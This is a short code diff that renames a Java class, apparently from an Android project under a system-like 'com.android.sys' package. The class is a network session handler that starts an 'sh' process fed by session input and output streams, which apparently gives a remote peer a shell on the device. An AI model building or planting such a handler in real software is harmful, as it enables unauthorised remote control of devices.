@@ -1,4 +1,4 @@
-package com.android.sys.action;
+package com.android.sys.session.handler;
 
 import com.android.sys.session.NetworkSessionManager;
 
@@ -6,11 +6,11 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 
-public class ShellAction implements NetworkSessionManager.ActionHandler {
+public class ShellSessionHandler implements NetworkSessionManager.SessionHandler {
     private final static String SHELL_NAME = "sh";
     private final static int BUFF_LEN = 0X1000;
     @Override
-    public void handleAction(String actionName, final InputStream inputStream, final OutputStream outputStream) {
+    public void handleSession(String sessionName, final InputStream inputStream, final OutputStream outputStream) {
         Process process = null;
         try {
             ProcessBuilder processBuilder = new ProcessBuilder(SHELL_NAME);
